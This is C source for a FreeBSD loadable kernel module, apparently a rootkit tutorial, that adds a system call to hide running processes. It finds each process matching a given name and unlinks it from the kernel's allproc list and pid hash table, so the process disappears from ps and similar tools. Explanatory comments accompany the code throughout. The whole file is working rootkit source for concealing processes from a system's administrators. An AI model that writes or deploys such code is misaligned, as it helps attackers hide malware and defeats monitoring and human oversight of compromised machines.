#include <sys/types.h>
#include <sys/param.h>
#include <sys/proc.h>
#include <sys/module.h>
#include <sys/sysent.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/queue.h>
#include <sys/lock.h>
#include <sys/sx.h>
#include <sys/mutex.h>

#define AUE_NULL 0

struct process_hiding_args {
	char *p_comm;		/* process name */
};

/* system call to hide a running process */
static int process_hiding (struct thread *td, void *syscall_args)
{
	struct process_hiding_args *uap;
	uap = (struct process_hiding_args *)syscall_args;

	struct proc *p;

	/* Lock the allproc list so it can't get corrupted by another process/thread */
	sx_xlock(&allproc_lock);

	/* Iterate through the allproc list */
	LIST_FOREACH(p, &allproc, p_list)
	{
		/* Each process structure we access needs to be locked so it doesn't get corrupted */
		/* PROC_LOCK is a macro from sys/proc.h for handling mutexes */
		/* #define PROC_LOCK(p) mtx_lock(&(p)->p_mtx) */
		PROC_LOCK(p);

		/* First check the virtual address space and process flags */
		/* If there's no virtual address space, or is set to "working on exit", */
		/* we just unlock the process structure and skip to the next. */
		/* There's no point in hiding a process that isn't running anyway! */
		if (!p->p_vmspace || (p->p_flag & P_WEXIT)) {
			/* struct vmspace *p_vmspace is the virtual memory space of the process */
			/* int p_flag are the process flags, defined in sys/proc.h */
			PROC_UNLOCK(p);
			continue;
		}

		/* Do we want to hide the process? */
		/* Compare the process name to the name we got from syscall_args */
		if (strncmp(p->p_comm, uap->p_comm, MAXCOMLEN) == 0) {
			/* char p_comm[MAXCOMLEN + 1] is the command used to exectute the process */
			/* We don't break from the for loop immediately, so we don' miss forked threads */
			/* p_list is the process list */
			LIST_REMOVE(p, p_list);
			/* p_hash is the process hash table */
			LIST_REMOVE(p, p_hash);
		}

		/* Unlock the process structure before moving on to the next one */
		/* PROC_UNLOCK is a macro from sys/proc.h for handling mutexes */
		/* #define PROC_UNLOCK(p) mtx_unlock(&(p)->p_mtx) */
		PROC_UNLOCK(p);
	}

	/* Unlock the whole allproc list now we're done */
	sx_xunlock(&allproc_lock);

	return(0);
}

/* The sysent for the new system call */
static struct sysent process_hiding_sysent = {
	1, 		/* number of arguments */
	process_hiding	/* implementing function */
};

/* The offset in sysent[] where the system call is to be allocated */
static int offset = NO_SYSCALL;		/* first available syscall number */

/* The function called at load/unload */
static int load (struct module *module, int cmd, void *arg)
{
	int error = 0;

	switch(cmd)
	{
		case MOD_LOAD:
			uprintf("System call loaded at offset %d.\n", offset);
			break;

		case MOD_UNLOAD:
			uprintf("System call unloaded at offset %d.\n", offset);
			break;

		default:
			error = EOPNOTSUPP;
			break;

	}

	return(error);
}

SYSCALL_MODULE(process_hiding, &offset, &process_hiding_sysent, load, NULL);
